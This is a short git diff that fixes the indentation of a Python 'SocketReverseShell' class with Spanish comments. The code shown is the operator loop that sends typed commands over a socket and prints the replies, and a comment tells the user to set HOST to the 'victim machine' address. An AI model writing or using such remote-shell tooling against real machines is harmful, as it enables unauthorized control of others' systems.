@@ -12,15 +12,15 @@ class SocketReverseShell:
             while True:
                 command_send = input('Ingresa un comando (escribe "exit" para salir): ')
 
-               if command_send == "exit":
-                   client_socket.sendall(command_send.encode('utf-8'))
-                   client_socket.close()
+                if command_send == "exit":
+                    client_socket.sendall(command_send.encode('utf-8'))
+                    client_socket.close()
 
-              client_socket.sendall(command_send.encode('utf-8'))
-              result_output_message_recv = client_socket.recv(1024)
+                client_socket.sendall(command_send.encode('utf-8'))
+                result_output_message_recv = client_socket.recv(1024)
 
-              message_decoder = result_output_message_recv.decode()
-              print(message_decoder)
+                message_decoder = result_output_message_recv.decode()
+                print(message_decoder)
 
 if __name__ == '__main__':
     HOST = "127.0.0.1" # Cambia esta IP por la máquina víctima.
